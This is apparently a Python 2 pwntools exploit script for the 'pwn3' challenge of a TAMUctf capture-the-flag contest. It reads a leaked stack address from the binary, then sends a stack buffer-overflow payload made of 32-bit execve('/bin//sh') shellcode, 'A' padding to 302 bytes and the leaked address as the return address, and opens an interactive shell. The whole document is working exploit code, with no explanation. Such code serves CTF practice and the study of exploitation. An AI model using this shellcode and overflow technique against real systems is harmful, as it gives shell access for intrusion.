from pwn import *

e = ELF("./pwn3")
p = process("./pwn3")
#p = remote("pwn.tamuctf.com", 4323)

data = p.recvuntil('0x')
data = p.recvuntil('!')[:-1]
print data

size = 302
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\xC3'
padd = 'A'*(size-len(shellcode))
#print str(len(shellcode)) + ' '+ str(len(padd))+ ' ' +str(size)
eip = '0x'+data
eip = int(eip,16)
#print p32(eip)
payload = shellcode+padd+p32(eip)
p.sendline(payload)
p.interactive()
